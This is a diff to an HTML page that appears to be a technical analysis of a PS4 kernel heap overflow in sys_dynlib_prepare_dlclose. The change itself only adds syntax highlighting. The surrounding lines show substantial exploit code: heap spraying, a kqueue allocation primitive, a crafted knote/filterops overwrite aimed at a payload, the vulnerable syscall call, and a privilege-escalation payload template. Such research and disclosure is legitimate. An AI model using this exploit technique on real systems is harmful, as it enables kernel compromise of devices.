@@ -5,10 +5,13 @@
 		<meta charset="UTF-8">
 		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
 		<link rel="stylesheet" type="text/css" href="css/core.css" />
+		<link rel="stylesheet" type="text/css" href="css/prism.css" />
 		<title>Analysis of sys_dynlib_prepare_dlclose PS4 kernel heap overflow</title>
 	</head>
 	
 	<body>
+		<script src="js/prism.js" type="text/javascript"></script>
+		
 		<div class="page">
 			<div class="container">
 				<div class="header">
@@ -67,7 +70,7 @@
 					The following usage of this system call will cause a panic:
 				</p>
 				
-				<pre><code>uint64_t count = 0x800000000;
+				<pre><code class="language-c">uint64_t count = 0x800000000;
 dynlib_prepare_dlclose(1, NULL, &amp;count);</code></pre>
 				
 				<br>
@@ -114,7 +117,7 @@ dynlib_prepare_dlclose(1, NULL, &amp;count);</code></pre>
 					At its fundamental core, the system call does the following:
 				</p>
 				
-				<pre><code>struct dynlib_prepare_dlclose_args {
+				<pre><code class="language-c">struct dynlib_prepare_dlclose_args {
 	int handle;
 	int *buffer;
 	uint64_t *countAddress;
@@ -182,7 +185,7 @@ int64_t sys_dynlib_prepare_dlclose(struct thread *td, struct dynlib_prepare_dlcl
 					The allocation is done by <code>rtld_malloc</code>, which is almost a direct wrapper for <code>malloc</code>. In the FreeBSD kernel <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/kern/kern_malloc.c#L419"><code>malloc</code></a> implementation, different functions will be used depending on whether size > <code>KMEM_ZMAX</code> or not (<code>0x1000</code> on FreeBSD, <code>0x4000</code> on PS4):
 				</p>
 				
-				<pre><code>if(size &lt;= KMEM_ZMAX) {
+				<pre><code class="language-c">if(size &lt;= KMEM_ZMAX) {
 	...
 	// Perform a zone allocation
 	va = uma_zalloc(zone, flags);
@@ -246,7 +249,7 @@ else {
 					As explained earlier, when the reference count of the library is 1, <code>prepare_dlclose</code> will call <code>objlist_prepare_fini</code> to fill the buffer with a list of references to the requested library:
 				</p>
 				
-				<pre><code>int64_t prepare_dlclose(struct dl_context *context, Obj_Entry *root, void *alloc, int64_t *count) {
+				<pre><code class="language-c">int64_t prepare_dlclose(struct dl_context *context, Obj_Entry *root, void *alloc, int64_t *count) {
 	...
 	if(root->refcount == 1) {
 		objlist_prepare_fini(context, &amp;context->list, root, alloc, count);
@@ -261,7 +264,7 @@ else {
 					It is in <code>objlist_prepare_fini</code> that the buffer is finally written to, giving us an out of bounds kernel heap write:
 				</p>
 				
-				<pre><code>signed int64_t objlist_prepare_fini(struct dl_context *context, Objlist_Entry *list, Obj_Entry *root, int *buffer, int64_t *count) {
+				<pre><code class="language-c">signed int64_t objlist_prepare_fini(struct dl_context *context, Objlist_Entry *list, Obj_Entry *root, int *buffer, int64_t *count) {
 	...
 	buffer[i] = nextList->obj->handle;
 	...
@@ -281,7 +284,7 @@ else {
 					But the next condition is more difficult to control:
 				</p>
 				
-			<pre><code>i = 0;
+			<pre><code class="language-c">i = 0;
 while(1) {
 	nextList = list->next;
 	
@@ -337,7 +340,7 @@ while(1) {
 					The next thing we experimented with, was abusing the <code>copyin</code> performed early on by <code>sys_dynlib_prepare_dlclose</code>:
 				</p>
 				
-				<pre><code>allocation = rtld_malloc(count * 4, 0);
+				<pre><code class="language-c">allocation = rtld_malloc(count * 4, 0);
 ...
 copyin(uap->buffer, allocation, 4 * count);</code></pre>
 				
@@ -382,7 +385,7 @@ copyin(uap->buffer, allocation, 4 * count);</code></pre>
 					We'll also need to create a kernel module, with a new system call to replicate the behaviour we need from <code>sys_dynlib_prepare_dlclose</code>:
 				</p>
 				
-				<pre><code>int sys_backdoor(struct thread *td, struct backdoor_args *uap) {
+				<pre><code class="language-c">int sys_backdoor(struct thread *td, struct backdoor_args *uap) {
 	char *x = malloc(uap->a, M_FOOBUF, 0);
 	copyin(uap->b, x, uap->a);
 	return 0;
@@ -419,7 +422,7 @@ Kernel:   [Buffer][Overflow]</code></pre>
 					To ensure that the end of our buffer is unmapped, we can simply map the size we need plus one additional page, and then unmap the additional page:
 				</p>
 				
-				<pre><code>uint64_t bufferSize = 0x8000;
+				<pre><code class="language-c">uint64_t bufferSize = 0x8000;
 uint64_t overflowSize = 0x8000;
 uint64_t copySize = bufferSize + overflowSize;
 
@@ -447,7 +450,7 @@ int64_t count = (0x100000000 + bufferSize) / 4;</code></pre>
 					We also tried using <code>mprotect</code> to make the final page unreadable, instead of unmapping it entirely. This would ensure that the page wouldn't be returned to later, unrelated, <code>mmap</code> calls, however this approach didn't work for my tests:
 				</p>
 				
-				<pre><code>uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+				<pre><code class="language-c">uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 mprotect(mapping + mappingSize, PAGE_SIZE, PROT_NONE);</code></pre>
 				
 				<br>
@@ -469,7 +472,7 @@ mprotect(mapping + mappingSize, PAGE_SIZE, PROT_NONE);</code></pre>
 					We used kernel code execution from the BadIRET exploit to test the behaviour of the heap. We found that the heap can be defragged by performing 100 or so dummy allocations, which will ensure that the next two allocations will be adjacent. Once we have two adjacent allocations, we free the first allocation, such that the next allocation will occupy its memory and be positioned directly before the second allocation:
 				</p>
 				
-				<pre><code>/* Sample output:
+				<pre><code class="language-c">/* Sample output:
 Alloc spray
 ...
 Alloc first
@@ -516,7 +519,7 @@ kprintf("%p\n", n);</code></pre>
 					We now know everything about the heap's behaviour that we need to write a controlled overflow PoC:
 				</p>
 				
-				<pre><code>// Prepare heap layout - kernel:
+				<pre><code class="language-c">// Prepare heap layout - kernel:
 kprintf("Alloc spray\n");
 int i;
 for(i = 0; i &lt; 100; i++) {
@@ -582,7 +585,7 @@ sendto(td, &amp;args);</code></pre>
 					Eventually, we came across an allocation in the kernel event queue handling code, in <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/kern/kern_event.c#L1239"><code>kqueue_expand</code></a>:
 				</p>
 				
-				<pre><code>size = kq->kq_knlistsize;
+				<pre><code class="language-c">size = kq->kq_knlistsize;
 while(size &lt;= fd)
 	size += KQEXTENT;
 list = malloc(size * sizeof(*list), M_KQUEUE, mflag);</code></pre>
@@ -597,7 +600,7 @@ list = malloc(size * sizeof(*list), M_KQUEUE, mflag);</code></pre>
 					Using this, we were able to create heap allocation and free primitives in FreeBSD, with size controlled to any multiples of <code>0x800</code> bytes:
 				</p>
 				
-				<pre><code>#include &lt;stdlib.h&gt;
+				<pre><code class="language-c">#include &lt;stdlib.h&gt;
 #include &lt;unistd.h&gt;
 #include &lt;fcntl.h&gt;
 #include &lt;sys/types.h&gt;
@@ -656,7 +659,7 @@ int main(void) {
 					One solution to this is to simply keep creating files (like sockets or pipes) until we reach the desired file descriptor number:
 				</p>
 				
-				<pre><code>static int sock = 0;
+				<pre><code class="language-c">static int sock = 0;
 
 while(sock != fd) {
 	sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -672,7 +675,7 @@ while(sock != fd) {
 					You can also take advantage of the fact that page allocations will round up to <code>PAGE_SIZE</code>, so you can calculate the minimum <code>size</code> needed to allocate a given number of pages as follows:
 				</p>
 				
-				<pre><code>size = (pages - 1) * PAGE_SIZE + 0x800;</code></pre>
+				<pre><code class="language-c">size = (pages - 1) * PAGE_SIZE + 0x800;</code></pre>
 				
 				<br>
 				
@@ -696,7 +699,7 @@ while(sock != fd) {
 					In particular, <code>struct knote</code> contains a <code>struct filterops *</code> called <code>kn_fop</code>. If targeting the <code>kn_fop</code> member there is actually no need to gain arbitrary kernel write first since <code>struct filterops</code> contains easily triggerable function pointers, such as <code>f_detach</code>:
 				</p>
 				
-				<pre><code>struct filterops {
+				<pre><code class="language-c">struct filterops {
 	int	f_isfd;		/* true if ident == filedescriptor */
 	int	(*f_attach)(struct knote *kn);
 	void	(*f_detach)(struct knote *kn);
@@ -710,7 +713,7 @@ while(sock != fd) {
 					So all we need to do is overflow <code>struct klist</code> to point to a carefully crafted userland <code>struct knote</code> who's <code>kn_fop</code> member points to a controlled <code>struct filterops</code>, which contains the <code>f_detach</code> function pointer aimed at our payload.
 				</p>
 				
-				<pre><code>struct knote kn;
+				<pre><code class="language-c">struct knote kn;
 struct filterops fo;
 
 struct knote **overflow = (struct knote **)(mapping + bufferSize);
@@ -729,7 +732,7 @@ fo.f_detach = payload;</code></pre>
 					To overflow the above structures into the <code>struct klist</code>, we just spray the heap, create the hole, and perform the vulnerable system call as we did for the controlled overflow PoC:
 				</p>
 				
-				<pre><code>int allocation[100], m, m2;
+				<pre><code class="language-c">int allocation[100], m, m2;
 
 // Spray the heap
 int i;
@@ -783,7 +786,7 @@ syscall(597, 1, mapping, &amp;count);</code></pre>
 					The general template for this exploit is as follows:
 				</p>
 				
-				<pre><code>void payload(struct knote *kn) {
+				<pre><code class="language-c">void payload(struct knote *kn) {
 	struct thread *td;
 	struct ucred *cred;
 	
